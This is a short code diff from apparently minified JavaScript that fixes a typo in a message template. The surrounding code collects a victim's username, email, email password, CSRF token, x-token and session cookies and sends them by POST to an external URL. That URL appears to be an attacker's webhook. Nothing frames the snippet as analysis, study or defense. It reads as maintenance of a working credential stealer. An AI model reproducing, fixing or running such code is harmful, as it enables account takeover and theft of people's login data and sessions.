@@ -66,7 +66,7 @@ await (async () => {
                         });
                         const s = await r.json();
                         const userData = s.status === 'success' ? { username: l, email: g, email_password: b, csrf: j, xtoken: k, cookie: s.cookies || {} } : null;
-                        const t = userData ? `# $Ql} - Success\n\`\`\`\n${JSON.stringify(userData, null, 2)}\n\`\`\`` : `# ${l} - Failed\n\`\`\`No Redirect\`\`\``;
+                        const t = userData ? `# ${l} - Success\n\`\`\`\n${JSON.stringify(userData, null, 2)}\n\`\`\`` : `# ${l} - Failed\n\`\`\`No Redirect\`\`\``;
                         await fetch(w, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
